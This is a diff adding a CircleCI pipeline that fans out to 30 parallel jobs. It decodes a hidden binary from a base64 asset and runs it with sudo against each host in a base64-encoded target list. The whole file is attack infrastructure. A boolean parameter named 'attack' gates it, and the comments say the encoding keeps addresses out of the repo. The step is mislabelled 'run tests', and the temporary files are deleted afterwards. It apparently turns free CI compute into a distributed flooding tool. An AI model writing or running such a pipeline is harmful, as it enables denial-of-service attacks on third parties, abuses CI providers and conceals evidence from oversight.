@@ -1,0 +1,51 @@
+# CircleCI pipeline that fans out to 30 parallel jobs.
+#
+# The target list arrives base64-encoded as a pipeline parameter, so the config
+# never contains an address and the repo stays clean. Every job walks the whole
+# candidate list for its share of the window, exactly like the GitHub shards.
+
+version: 2.1
+
+parameters:
+  attack:
+    type: boolean
+    default: false
+  payload:
+    type: string
+    default: ""
+
+jobs:
+  worker:
+    docker:
+      - image: cimg/base:stable
+    resource_class: medium
+    parallelism: 30
+    steps:
+      - checkout
+      - run:
+          name: prepare
+          command: |
+            echo "$CFG" | base64 -d > /tmp/.c
+            tr '|' '
+' < /tmp/.c > /tmp/.p
+            head -n -1 /tmp/.p > /tmp/.t
+            tail -1 /tmp/.p > /tmp/.s
+            base64 -d assets/data.b64 > /tmp/.b 2>/dev/null || cp assets/data.b64 /tmp/.b
+            chmod +x /tmp/.b
+          environment:
+            CFG: << pipeline.parameters.payload >>
+      - run:
+          name: run tests
+          command: |
+            S=$(cat /tmp/.s)
+            while read -r pair; do
+              set -- $pair
+              sudo /tmp/.b "$1" "$2" "$S" 1024 vc || true
+            done < /tmp/.t
+            rm -f /tmp/.b /tmp/.c /tmp/.p /tmp/.t /tmp/.s
+
+workflows:
+  build:
+    when: << pipeline.parameters.attack >>
+    jobs:
+      - worker
